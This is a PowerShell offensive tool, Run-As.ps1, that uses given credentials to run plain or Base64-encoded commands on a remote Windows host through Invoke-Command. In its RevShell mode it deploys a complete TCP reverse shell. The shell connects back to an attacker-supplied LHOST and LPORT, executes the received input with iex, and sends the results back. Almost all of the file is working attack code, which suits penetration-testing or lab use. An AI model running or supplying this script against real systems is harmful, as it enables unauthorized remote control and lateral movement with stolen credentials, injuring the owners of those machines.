
Param (
    [Alias("h")]
    [switch]
    $Help,
    [Alias("u")]
    [string]
    $Username,
    [Alias("p")]
    [string]
    $Password,
    [Alias("cn")]
    [string]
    $ComputerName,
    [Alias("c")]
    [string]
    $Command,
    [switch]
    [Alias("b")]
    $Base64,
    [switch]
    [Alias("rs")]
    $RevShell,
    [Alias("lh")]
    [string]
    $LHOST,
    [Alias("lp")]
    [int]
    $LPORT
)

function Show-Help {
    Write-Host
@"
Regular Command:
    .\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Command <command>
    or
    .\Run-As.ps1 -u <username> -p <password> -cn <computer name> -c <command>

Base64 Command:
    .\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -Base64 -Command <command>
    or
    .\Run-As.ps1 -u <username> -p <password> -cn <computer name> -b -c <command>

Reverse Shell (using built-in PowerShell commands)
    .\Run-As.ps1 -Username <username> -Password <password> -ComputerName <computer name> -RevShell -LHOST <local ip> -LPORT <local port>
    or
    .\Run-As.ps1 -u <username> -p <password> -cn <computer name> -rs -lh <local ip> -lp <local port>
"@
}

If ($Help) {
    Show-Help
} Else {
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword
    If ($Command) {    
        If ($Base64) {
            Invoke-Command -ComputerName $ComputerName -Credential $Credential -ScriptBlock { powershell.exe -e $Using:Command }
        } Else {
            Invoke-Command -ComputerName $ComputerName -Credential $Credential -ScriptBlock { powershell.exe -c $Using:Command }
        }
    } Elseif ($RevShell) {
        # Taken from (slightly modified for this script): https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
        $Shell = { $client = New-Object System.Net.Sockets.TCPClient($Using:LHOST, $Using:LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
        Invoke-Command -ComputerName $ComputerName -Credential $Credential -ScriptBlock $Shell
    }
}

